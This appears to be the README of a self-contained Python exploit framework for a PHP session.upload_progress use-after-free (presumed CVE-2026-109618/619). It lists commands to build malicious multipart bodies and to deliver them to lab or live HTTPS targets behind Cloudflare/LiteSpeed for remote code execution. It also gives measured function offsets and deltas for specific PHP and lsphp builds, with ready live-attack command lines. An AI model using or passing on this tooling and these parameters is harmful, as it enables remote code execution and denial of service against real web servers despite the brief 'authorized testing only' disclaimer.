# php_up_framework.py - final exploit framework (self-contained)

One stdlib-only Python module. Validates, builds, extracts, and delivers for
the PHP session.upload_progress UAF (presumed CVE-2026-109618/619).

## Modes

    python3 php_up_framework.py --selftest
        Verify forge/body layout (FCI, fn ptr, system string) + both bug bodies.

    python3 php_up_framework.py --syms --binary /path/php-binary
        Extract per-build symbols: zval_ptr_dtor, zend_call_function, delta_call.
        THE correct way to get the target delta (author 0x43EF0 is 8.5.4-only).

    python3 php_up_framework.py --build --bug 618|619 --dtor <leak> --out body.bin
        Build a multipart body (forge + reclaim + stall split). Writes to file.

    python3 php_up_framework.py --lab --bug 618|619 --dtor <leak>
        Deliver to a php-fpm lab (FCGI streaming == lsphp class) with the
        >min_freq stall. Use --lab-port/--lab-script to point at the pool.

    python3 php_up_framework.py --live URL --bug 618|619 --dtor <leak>
        Deliver over HTTPS through Cloudflare/LiteSpeed. Requires the REAL
        lsphp --dtor; a wrong delta crashes a worker (DoS), not RCE.

    --call <addr> overrides --dtor (call = dtor - delta).

## Critical facts baked in (verified against real php-src headers)
  - zend_fcall_info        = 64B ; function_name@8, param_count@48
  - zend_internal_function.handler = +88
  - IS_STRING_EX 0x106, IS_OBJECT_EX 0x308
  - The forge needs the per-build delta: --syms is authoritative.
  - DELTA_CALL_AUTHOR 0x43EF0 is ONLY Ubuntu php 8.5.4 profile-21.

## Known deltas (measured this session)
  - php 8.2.34 (cli)              : delta_call 0xc2f0 (dtor 0x4304d0)
  - php 8.4.4  (fpm)              : delta_call 0x2b273a (dtor 0xdbc28c)
  - LiteSpeed lsphp82 8.2.34 (official -dbg symbols; build-id verified vs binary):
    +bookworm : call 0x511ae0  dtor 0x51e410  delta 0xc930
    +noble    : call 0x533ba0  dtor 0x540a90  delta 0xcef0
    +jammy    : call 0x51fb90  dtor 0x52cbf0  delta 0xd060
  Offline debug files: lsphp82-8.2.34-1-{bookworm,noble,jammy}.zval.debug
Usage for the lsphp case:
  python3 php_up_framework.py --syms --binary lsphp82-8.2.34-1-bookworm.zval.debug
  python3 php_up_framework.py --live URL --bug 619 --dtor 0x51e410  # bookworm

## Usage boundary
Authorized testing only (own infrastructure). Live RCE is achieved under
constraint: the actual serving lsphp's --dtor must be correct; without it the
forge faults a worker.